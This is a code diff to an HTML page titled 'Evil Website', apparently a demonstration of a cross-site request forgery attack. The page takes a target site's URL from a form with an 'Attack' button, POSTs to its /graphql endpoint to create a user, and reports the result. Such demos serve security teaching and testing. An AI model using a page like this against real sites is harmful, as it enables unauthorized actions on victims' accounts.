@@ -5,15 +5,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Evil Website</title>
   </head>
-  <body>
+  <body style="font-family: system-ui, sans-serif">
+    <h1>Evil website</h1>
+    <form>
+      <label>
+        Vulnerable site:
+        <input type="url" />
+      </label>
+      <button type="submit">Attack</button>
+    </form>
     <pre id="logs"></pre>
     <script type="module">
       const $logs = document.querySelector('#logs');
-      const url = new URL(window.location.href);
-      const site = url.searchParams.get('site');
-      if (site) {
+      const $form = document.querySelector('form');
+      const $url = document.querySelector('input');
+
+      $form.addEventListener('submit', async (event) => {
+        event.preventDefault();
         $logs.textContent = 'Loading...';
         try {
+          let site = $url.value;
+          if (!site.endsWith('/graphql')) site += '/graphql';
           const { data, errors } = await fetch(site, {
             method: 'POST',
             headers: {
@@ -25,16 +37,16 @@
             }),
           }).then((response) => response.json());
           if (errors) {
-            $logs.textContent = JSON.stringify(errors, null, 2);
+            $logs.textContent =
+              'Failed to create a user.\n' + JSON.stringify(errors, null, 2);
           } else {
-            $logs.textContent = JSON.stringify(data, null, 2);
+            $logs.textContent =
+              'Created a user successfully!\n' + JSON.stringify(data, null, 2);
           }
         } catch (error) {
-          $logs.textContent = error.message;
+          $logs.textContent = 'The request failed.\n' + error.message;
         }
-      } else {
-        $logs.textContent = 'No site specified';
-      }
+      });
     </script>
   </body>
 </html>
